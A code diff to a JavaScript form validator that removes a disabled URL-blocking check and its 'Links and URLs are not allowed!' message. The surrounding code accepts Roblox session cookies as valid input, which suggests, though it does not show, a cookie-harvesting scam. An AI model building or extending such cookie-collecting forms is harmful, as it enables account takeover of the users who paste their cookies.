@@ -96,20 +96,7 @@ function isValidCode(code) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // URL blocking temporarily disabled for testing
-    /*
-    const urlPatterns = [
-        /^https?:\/\/[^\s]+$/i,
-        /^www\.[^\s]+$/i,
-        /^discord\.gg\/[^\s]+$/i,
-    ];
-
-    for (const pattern of urlPatterns) {
-        if (pattern.test(cleanCode) || pattern.test(preprocessed)) {
-            return { valid: false, reason: 'Links and URLs are not allowed!', isLink: true };
-        }
-    }
-    */
+    // URLs and links are now fully allowed
 
     // THIRD: Check for basic spam patterns
     const spamPatterns = [
@@ -474,11 +461,7 @@ compileForm.addEventListener('submit', async (e) => {
             return;
         }
         
-        // Special handling for links
-        if (validation.isLink) {
-            showCompileStatus('❌ Links and URLs are not allowed!', 'error');
-            return;
-        }
+
         
         showCompileStatus(validation.reason, 'error');
         return;
